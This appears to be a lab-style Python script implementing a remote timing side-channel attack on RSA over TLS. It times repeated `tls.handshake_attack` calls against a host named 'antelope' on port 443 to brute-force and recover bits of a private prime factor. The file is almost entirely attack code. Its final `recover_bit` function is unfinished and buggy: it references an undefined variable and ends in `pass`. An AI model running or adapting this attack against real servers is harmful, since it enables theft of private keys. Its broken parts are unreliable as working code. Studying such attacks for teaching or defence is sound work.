import sympy
import socket
import tls
import gc


q = sympy.Integer(
    11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283
)
p = sympy.Integer(
    11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789
)


def sympy_integer_to_bits(integer, byteorder="big"):
    bits = []

    reduced = integer
    while reduced > 0:
        bits.append(reduced % 2)
        reduced = reduced // 2

    if byteorder == "big":
        bits.reverse()

    return bits


def sympy_integer_to_bytes(integer, byteorder="big", length=None):
    bys = []

    reduced = integer
    while reduced > 0:
        bys.append(reduced % 256)
        reduced = reduced // 256

    if length:
        bys = bys + [0] * (length - len(bys))

    if byteorder == "big":
        bys.reverse()

    return bys


def bits_to_sympy_integer(bits, byteorder="big"):
    num_bits = len(bits)

    integer = sympy.Integer(0)

    for index, bit in enumerate(bits):
        if byteorder == "big":
            power = num_bits - index - 1
        elif byteorder == "little":
            power = index
        else:
            raise Exception()

        integer += bit * 2 ** power

    return integer


def sample(points, samples):
    gc.disable()

    for point in points:
        for iteration in range(samples):
            gc.collect()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("antelope", 443))

            start_time, response, end_time = tls.handshake_attack(sock, g=point)
            print(point, end_time - start_time)

            sock.close()


def bruteforce_most_significant_bits():
    gs = []
    for h in (0, 1):
        for i in (0, 1):
            for j in (0, 1):
                for k in (0, 1):
                    for l in (0, 1):
                        g = bits_to_sympy_integer([h, i, j, k, l] + [0] * 508)
                        gs.append(g)

    minimum = sympy.sympify("2**511")
    maximum = sympy.sympify("3*2**512")
    gs = [g for g in gs if minimum <= g <= maximum]

    gs.append(p)
    gs.append(q)

    sample(gs, 5000)


def recover_bit(known_q_bits, total_bits, N):
    i = len(known_q_bits) + 1

    num_bits_left = total_bits - (i + 1)
    g_bits = known_q_bits + bytearray([0] * num_bits_left)

    g_high_bits = g_bits
    g_high_bits[i] = 1

    g = bits_to_sympy_integer(g_bits)
    g_high = bits_to_sympy_integer(g_high)

    # if q[i] == 1 then: g < g_high < q
    # else:              g < q < g_high
    R = sympy.Integer(2) ** 512
    u_g = (g * R ** (-1)) % N
    pass


if __name__ == "__main__":
    bruteforce_most_significant_bits()